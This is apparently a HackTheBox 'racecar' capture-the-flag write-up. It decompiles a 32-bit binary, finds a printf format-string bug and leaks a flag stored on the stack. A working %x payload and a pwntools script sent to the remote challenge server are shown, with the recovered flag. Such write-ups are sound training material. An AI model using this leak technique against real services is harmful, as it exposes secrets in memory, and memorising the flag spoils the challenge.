---
layout: post
title: HackTheBox Challenge racecar (Pwn)
date: 2021-08-01
tags: [HackTheBox, Challenge, Pwn]
---

# Challenge Synopsis

Did you know that racecar spelled backwards is racecar? Well, now that you know everything about racing, win this race and get the flag! ([Source](https://app.hackthebox.com/challenges/racecar))

# Enumeration

```bash
❯ file racecar
racecar: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c5631a370f7704c44312f6692e1da56c25c1863c, not stripped

❯ checksec --file=racecar
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   96 Symbols	  No	0		3		racecar

❯ ./racecar

🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌
      ______                                       |xxx|
     /|_||_\`.__                                   | F |
    (   _    _ _\                                  |xxx|
*** =`-(_)--(_)-'                                  | I |
                                                   |xxx|
                                                   | N |
                                                   |xxx|
                                                   | I |
                                                   |xxx|
             _-_-  _/\______\__                    | S |
           _-_-__ / ,-. -|-  ,-.`-.                |xxx|
            _-_- `( o )----( o )-'                 | H |
                   `-'      `-'                    |xxx|
🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌

Insert your data:

Name: Shiro
Nickname: shiro

[+] Welcome [Shiro]!

[*] Your name is [Shiro] but everybody calls you.. [shiro]!
[*] Current coins: [69]

1. Car info
2. Car selection
> 1

🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌

Car #1 stats:   🚗

[Speed]:        ▋▋▋▋

[Acceleration]: ▋▋▋▋▋

[Handling]:     ▋▋▋▋▋▋▋▋

🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌

Car #2 stats:   🏎️

[Speed]:        ▋▋▋▋▋▋▋▋▋

[Acceleration]: ▋▋▋▋▋▋▋▋

[Handling]:     ▋▋

🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌

1. Car info
2. Car selection
> 2


Select car:
1. 🚗
2. 🏎️
> 2


Select race:
1. Highway battle
2. Circuit
> 1

[*] Waiting for the race to finish...

[+] You won the race!! You get 100 coins!
[+] Current coins: [169]

[!] Do you have anything to say to the press after your big victory?
> test

The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
test
```

Decompiling the binary in Ghidra reveals the following functions.

##### `main`

```c
void main(void)

{
  int iVar1;
  int iVar2;
  int in_GS_OFFSET;
  
  iVar1 = *(int *)(in_GS_OFFSET + 0x14);
  setup();
  banner();
  info();
  while (check != 0) {
    iVar2 = menu();
    if (iVar2 == 1) {
      car_info();
    }
    else if (iVar2 == 2) {
      check = 0;
      car_menu();
    }
    else {
      printf("\n%s[-] Invalid choice!%s\n",&DAT_00011548,&DAT_00011538);
    }
  }
  if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail_local();
  }
  return;
}
```

##### `car_menu`

```c
void car_menu(void)

{
  int iVar1;
  int iVar2;
  uint __seed;
  int iVar3;
  size_t sVar4;
  char *__format;
  FILE *__stream;
  int in_GS_OFFSET;
  undefined *puVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  uint local_54;
  char local_3c [44];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  uVar6 = 0xffffffff;
  uVar7 = 0xffffffff;
  do {
    printf(&DAT_00011948);
    iVar1 = read_int(uVar6,uVar7);
    if ((iVar1 != 2) && (iVar1 != 1)) {
      printf("\n%s[-] Invalid choice!%s\n",&DAT_00011548,&DAT_00011538);
    }
  } while ((iVar1 != 2) && (iVar1 != 1));
  iVar2 = race_type();
  __seed = time((time_t *)0x0);
  srand(__seed);
  if (((iVar1 == 1) && (iVar2 == 2)) || ((iVar1 == 2 && (iVar2 == 2)))) {
    iVar2 = rand();
    iVar2 = iVar2 % 10;
    iVar3 = rand();
    iVar3 = iVar3 % 100;
  }
  else if (((iVar1 == 1) && (iVar2 == 1)) || ((iVar1 == 2 && (iVar2 == 1)))) {
    iVar2 = rand();
    iVar2 = iVar2 % 100;
    iVar3 = rand();
    iVar3 = iVar3 % 10;
  }
  else {
    iVar2 = rand();
    iVar2 = iVar2 % 100;
    iVar3 = rand();
    iVar3 = iVar3 % 100;
  }
  local_54 = 0;
  while( true ) {
    sVar4 = strlen("\n[*] Waiting for the race to finish...");
    if (sVar4 <= local_54) break;
    putchar((int)"\n[*] Waiting for the race to finish..."[local_54]);
    if ("\n[*] Waiting for the race to finish..."[local_54] == '.') {
      sleep(0);
    }
    local_54 = local_54 + 1;
  }
  if (((iVar1 == 1) && (iVar2 < iVar3)) || ((iVar1 == 2 && (iVar3 < iVar2)))) {
    printf("%s\n\n[+] You won the race!! You get 100 coins!\n",&DAT_00011540);
    coins = coins + 100;
    puVar5 = &DAT_00011538;
    printf("[+] Current coins: [%d]%s\n",coins,&DAT_00011538);
    printf("\n[!] Do you have anything to say to the press after your big victory?\n> %s",
           &DAT_000119de);
    __format = (char *)malloc(0x171);
    __stream = fopen("flag.txt","r");
    if (__stream == (FILE *)0x0) {
      printf("%s[-] Could not open flag.txt. Please contact the creator.\n",&DAT_00011548,puVar5);
                    /* WARNING: Subroutine does not return */
      exit(0x69);
    }
    fgets(local_3c,0x2c,__stream);
    read(0,__format,0x170);
    puts(
        "\n\x1b[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \x1b[0m"
        );
    printf(__format);
  }
  else if (((iVar1 == 1) && (iVar3 < iVar2)) || ((iVar1 == 2 && (iVar2 < iVar3)))) {
    printf("%s\n\n[-] You lost the race and all your coins!\n",&DAT_00011548);
    coins = 0;
    printf("[+] Current coins: [%d]%s\n",0,&DAT_00011538);
  }
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail_local();
  }
  return;
}
```

Reviewing the `car_menu` code, we can see a potential vulnerability being [format string attack](https://owasp.org/www-community/attacks/Format_string_attack#:~:text=The%20attack%20could%20be%20executed,in%20the%20parameters%20is%20executed.) due to the use of `printf(__format);`.

# Exploitation

```bash
❯ echo 'AAAABBBBCCCC' > flag.txt

❯ gdb ./racecar
pwndbg> disassemble main
Dump of assembler code for function main:
   0x000013e1 <+0>:	lea    ecx,[esp+0x4]
   0x000013e5 <+4>:	and    esp,0xfffffff0
   0x000013e8 <+7>:	push   DWORD PTR [ecx-0x4]
   0x000013eb <+10>:	push   ebp
   0x000013ec <+11>:	mov    ebp,esp
   0x000013ee <+13>:	push   ebx
   0x000013ef <+14>:	push   ecx
   0x000013f0 <+15>:	sub    esp,0x10
   0x000013f3 <+18>:	call   0x7d0 <__x86.get_pc_thunk.bx>
   0x000013f8 <+23>:	add    ebx,0x2b94
   0x000013fe <+29>:	mov    eax,gs:0x14
   0x00001404 <+35>:	mov    DWORD PTR [ebp-0xc],eax
   0x00001407 <+38>:	xor    eax,eax
   0x00001409 <+40>:	call   0xb93 <setup>
   0x0000140e <+45>:	call   0x929 <banner>
   0x00001413 <+50>:	call   0x1082 <info>
   0x00001418 <+55>:	jmp    0x1463 <main+130>
   0x0000141a <+57>:	call   0x1352 <menu>
   0x0000141f <+62>:	cmp    eax,0x1
   0x00001422 <+65>:	je     0x142b <main+74>
   0x00001424 <+67>:	cmp    eax,0x2
   0x00001427 <+70>:	je     0x1432 <main+81>
   0x00001429 <+72>:	jmp    0x1443 <main+98>
   0x0000142b <+74>:	call   0x11d2 <car_info>
   0x00001430 <+79>:	jmp    0x1463 <main+130>
   0x00001432 <+81>:	mov    DWORD PTR [ebx+0x80],0x0
   0x0000143c <+91>:	call   0xc91 <car_menu>
   0x00001441 <+96>:	jmp    0x1463 <main+130>
   0x00001443 <+98>:	sub    esp,0x4
   0x00001446 <+101>:	lea    eax,[ebx-0x2a54]
   0x0000144c <+107>:	push   eax
   0x0000144d <+108>:	lea    eax,[ebx-0x2a44]
   0x00001453 <+114>:	push   eax
   0x00001454 <+115>:	lea    eax,[ebx-0x2661]
   0x0000145a <+121>:	push   eax
   0x0000145b <+122>:	call   0x670 <printf@plt>
   0x00001460 <+127>:	add    esp,0x10
   0x00001463 <+130>:	mov    eax,DWORD PTR [ebx+0x80]
   0x00001469 <+136>:	test   eax,eax
   0x0000146b <+138>:	jne    0x141a <main+57>
   0x0000146d <+140>:	nop
   0x0000146e <+141>:	mov    eax,DWORD PTR [ebp-0xc]
   0x00001471 <+144>:	xor    eax,DWORD PTR gs:0x14
   0x00001478 <+151>:	je     0x147f <main+158>
   0x0000147a <+153>:	call   0x1500 <__stack_chk_fail_local>
   0x0000147f <+158>:	lea    esp,[ebp-0x8]
   0x00001482 <+161>:	pop    ecx
   0x00001483 <+162>:	pop    ebx
   0x00001484 <+163>:	pop    ebp
   0x00001485 <+164>:	lea    esp,[ecx-0x4]
   0x00001488 <+167>:	ret
End of assembler dump.

pwndbg> r
...
[!] Do you have anything to say to the press after your big victory?
> %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x 

The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
5655a200 170 56555dfa 18 8 26 2 1 5655696c 5655a200 5655a380 41414141 42424242 43434343 eb2c000a 56556d58 56558f8c ffffd3a8 5655638d 56556540 5655a1a0 2 eb2c0b00 0 56558f8c ffffd3c8 56556441 0 0 0
[Inferior 1 (process 16421) exited normally]
```

Notice the output `41414141 42424242 43434343`? That is the pseudo `flag.txt` value being printed out. 

Lets try the same options and payload on the remote server.

```bash
❯ nc 83.136.253.216 47166
...
[!] Do you have anything to say to the press after your big victory?
> %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x 

The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
585661c0 170 565b8dfa 52 3 26 2 1 565b996c 585661c0 58566340 7b425448 5f796877 5f643164 34735f31 745f3376 665f3368 5f67346c 745f6e30 355f3368 6b633474 7d213f 27439e00 f7f593fc 565bbf8c ff850468 565b9441 1 ff850514 ff85051c 
```

Lets try to decode the `7b425448` value.

```bash
❯ python3
Python 3.12.8 (main, Dec 13 2024, 13:19:48) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import binascii
>>> binascii.unhexlify('7b425448')
b'{BTH'
```

Looks like we got a partial flag value and its in reverse order! We can craft a python script to help automate the decoding of the flag.

```bash
❯ cat solve.py
#!/usr/bin/env python3

from pwn import *
import binascii

def main():
    try:
        payload = b'%x ' * 30

        host = '83.136.253.216'
        port = '47166'

        p = remote(host, port)

        # Send interactions to the remote service to trigger the leak
        p.sendlineafter(b'Name:', b'a')  # Send 'a' for the name
        p.sendlineafter(b'Nickname:', b'aa')  # Send 'aa' for the nickname
        p.sendlineafter(b'>', b'2')  # Choose option 2
        p.sendlineafter(b'>', b'2')  # Choose option 2 again
        p.sendlineafter(b'>', b'1')  # Choose option 1
        p.sendlineafter(b'>', payload)  # Send the payload crafted above

        p.recv()

        response = p.recv().decode('utf-8')

        # Split the response and extract the line containing the encoded flag
        flag_encoded = response.split('\n')[2]
        print(f'Flag encoded in hex: {flag_encoded}')

        # Split the hex-encoded flag into individual hex values
        flag_encoded_array = flag_encoded.split(' ')
        decoded_flag = ''  # Variable to accumulate the decoded flag

        # Decode each hex value and reverse it to reconstruct the original flag
        for hex_value in flag_encoded_array:
            hex_value = hex_value.lstrip('0x')  # Remove any leading '0x' from the hex string

            try:
                # Decode the hex value into bytes, ignoring invalid characters
                decoded_bytes = bytearray.fromhex(hex_value).decode('utf-8', errors='replace')
                
                # Reverse the bytes to get the original flag
                reversed_bytes = decoded_bytes[::-1]
                decoded_flag += reversed_bytes  # Add the decoded part to the full flag

            except ValueError:
                # Skip any invalid hex values (they may not decode properly)
                continue

        # Print the decoded flag, removing any leading/trailing whitespace
        print(f'Decoded flag: {decoded_flag.strip()}')

    except Exception as e:
        # Handle any exceptions that might occur during the execution
        print(f'An error occurred: {e}')

if __name__ == '__main__':
    main()

❯ python3 solve.py
[+] Opening connection to 83.136.253.216 on port 47166: Done
Flag encoded in hex: 56d7b1c0 170 5656ddfa 38 7 26 2 1 5656e96c 56d7b1c0 56d7b340 7b425448 5f796877 5f643164 34735f31 745f3376 665f3368 5f67346c 745f6e30 355f3368 6b633474 7d213f 586db300 f7f1c3fc 56570f8c ff8c72b8 5656e441 1 ff8c7364 ff8c736c
Decoded flag: �ױV��VV8&l�VV�ױV@׳VHTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}\x00�mX�����\x0fWV�r��A�VVds��ls��
[*] Closed connection to 83.136.253.216 port 47166
```

**Flag:** `HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}`

